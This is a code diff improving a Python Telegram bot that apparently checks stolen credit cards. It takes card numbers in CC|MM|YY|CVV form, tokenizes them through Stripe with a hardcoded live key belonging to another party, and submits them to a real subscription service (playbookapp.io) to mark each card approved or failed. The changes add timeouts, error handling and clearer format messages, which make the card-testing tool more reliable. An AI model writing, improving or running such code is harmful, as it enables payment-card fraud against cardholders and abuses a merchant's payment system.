@@ -1,4 +1,3 @@
-import os
 import re
 import time
 import random
@@ -15,6 +14,12 @@ def generate_random_email():
     username = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     return f"{username}@gmail.com"
 
+def safe_json_parse(response):
+    try:
+        return response.json()
+    except Exception:
+        return None
+
 def process_card(card_data):
     try:
         # Parse card formats
@@ -23,7 +28,8 @@ def process_card(card_data):
         else:
             parts = card_data.split('|')
         if len(parts) != 4:
-            return "⚠️ Invalid format"
+            return "⚠️ Invalid format. Use CC|MM|YY|CVV or CC/MM/YY/CVV"
+
         cc, mm, yy, cvv = parts
         if len(yy) == 2:
             yy = f"20{yy}"
@@ -46,10 +52,17 @@ def process_card(card_data):
             "payment_user_agent": "stripe.js/aa3f8c0487; stripe-js-v3/aa3f8c0487; card-element",
             "key": "pk_live_7ZEzPfBzcpa67c2hVYYKAXdf008kTY3bSa"
         }
-        r1 = requests.post(stripe_url, headers=headers, data=data)
-        token = r1.json().get('id', '')
+        r1 = requests.post(stripe_url, headers=headers, data=data, timeout=15)
+        if r1.status_code != 200:
+            return f"❌ Stripe token request failed with status {r1.status_code}: {r1.text}"
+
+        token_json = safe_json_parse(r1)
+        if not token_json or 'id' not in token_json:
+            return f"❌ Invalid Stripe token response: {r1.text}"
+
+        token = token_json['id']
         if not token.startswith('tok_'):
-            return f"❌ Failed to get token: {r1.text}"
+            return f"❌ Failed to get valid token: {r1.text}"
 
         # Second request to final URL
         final_url = "https://my.playbookapp.io/management/subscription"
@@ -65,16 +78,24 @@ def process_card(card_data):
             "plan": "playbook_monthly",
             "metadata": {"sourceInfluencerId": 0}
         }
-        r2 = requests.post(final_url, headers=headers2, json=payload)
-        result = r2.json()
+        r2 = requests.post(final_url, headers=headers2, json=payload, timeout=15)
+        if r2.status_code != 200:
+            return f"❌ Final request failed with status {r2.status_code}: {r2.text}"
+
+        result = safe_json_parse(r2)
+        if result is None:
+            return f"❌ Failed to parse final response JSON: {r2.text}"
+
         if result.get("err", False):
             status = "✅ Approved"
         else:
             status = "❌ Failure"
         return f"{status}\nFull response:\n{result}"
 
+    except requests.exceptions.RequestException as e:
+        return f"⚠️ Network error: {str(e)}"
     except Exception as e:
-        return f"⚠️ Error: {str(e)}"
+        return f"⚠️ Unexpected error: {str(e)}"
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -114,5 +135,5 @@ def handle_cards(message):
     processing_users[user_id] = False
 
 if __name__ == "__main__":
-    bot.delete_webhook()  # Important to avoid 409 conflict
+    bot.delete_webhook()  # Remove webhook to avoid conflicts
     bot.infinity_polling()
